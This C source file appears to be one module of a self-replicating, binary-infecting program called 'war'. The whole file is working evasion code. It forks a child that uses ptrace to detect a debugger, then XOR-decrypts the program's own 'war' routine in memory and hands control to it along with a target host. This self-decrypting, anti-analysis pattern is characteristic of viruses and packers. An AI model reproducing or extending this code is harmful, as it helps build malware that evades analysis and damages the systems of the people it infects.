#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

__attribute__((always_inline)) static inline void decrypt_left(const struct s_keychain *keychain, char *callee, const size_t size)
{
	for (register size_t index = 0; index < size; index++)
		callee[index] ^= keychain->key[LEFT];
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void antidebug(struct s_host *host, struct s_keychain *keychain, enum e_context context)
{
	if (context == FAILURE)
		goto label;

	pid_t child = 0;
	int status = 0;

	if ((child = _fork()) < 0)
	{
		context = FAILURE;
		goto label;
	}

	if (child)
	{
		_wait4(child, &status, 0, NULL);
		if (WEXITSTATUS(status) == 1)
		{
			const char debug[] = "No debugger :)\n";
			_write(1, debug, _strlen(debug));
			_fatal(1);
		}
	}
	else
	{
		if (_ptrace(PTRACE_ATTACH, _getppid(), 0, 0) < 0)
			_fatal(1);
		
		_wait4(_getppid(), NULL, 0, NULL);
		_ptrace(PTRACE_CONT, 0, 0, 0);

		_ptrace(PTRACE_DETACH, _getppid(), 0, 0);
		_fatal(0);
	}

label:
	update_keychain_left(keychain, (char *)__entry, (void *)war - (void *)__entry);
	decrypt_left(keychain, (char *)war, (void *)find_host - (void *)war);

	war(host, keychain, context);
}
